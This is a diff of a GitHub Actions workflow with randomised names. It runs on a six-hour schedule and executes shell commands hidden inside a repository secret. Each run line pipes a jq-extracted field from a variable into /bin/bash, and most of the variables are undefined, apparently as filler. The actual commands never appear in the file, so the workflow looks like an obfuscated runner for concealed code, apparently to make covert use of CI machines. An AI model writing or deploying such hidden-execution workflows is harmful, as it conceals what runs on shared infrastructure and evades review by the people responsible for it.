@@ -3,7 +3,7 @@ name: mahenge4645
 on:
   workflow_dispatch:
   schedule:
-    - cron: '4 5/6 * * *'
+    - cron: '47 1/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,14 +12,13 @@ jobs:
       - uses: actions/checkout@v4
       - name: mahenge4645
         env:
-          ddh2272: ${{ secrets.ddh2272 }}
+          xox87: ${{ secrets.xox87 }}
         run: |
-          echo $ddh2272 | jq -r .col8238 | /bin/bash
-          echo $z0 | jq -r .dpqv251 | /bin/bash
-          echo $gli89 | jq -r .u17 | /bin/bash
-          echo $phh49432 | jq -r .r124 | /bin/bash
-          echo $d58 | jq -r .yzx0 | /bin/bash
-          echo $t6 | jq -r .t1 | /bin/bash
-          echo $bpzav78 | jq -r .euznu731 | /bin/bash
-          echo $ufpp98801 | jq -r .fxov06345 | /bin/bash
+          echo $xox87 | jq -r .tm50945 | /bin/bash
+          echo $fpl4 | jq -r .b47 | /bin/bash
+          echo $b7 | jq -r .htdc45 | /bin/bash
+          echo $qa576 | jq -r .cmrs09054 | /bin/bash
+          echo $peizt3 | jq -r .rv9 | /bin/bash
+          echo $wcjl7418 | jq -r .kue461 | /bin/bash
+          echo $hyr06353 | jq -r .exhsa7042 | /bin/bash
 
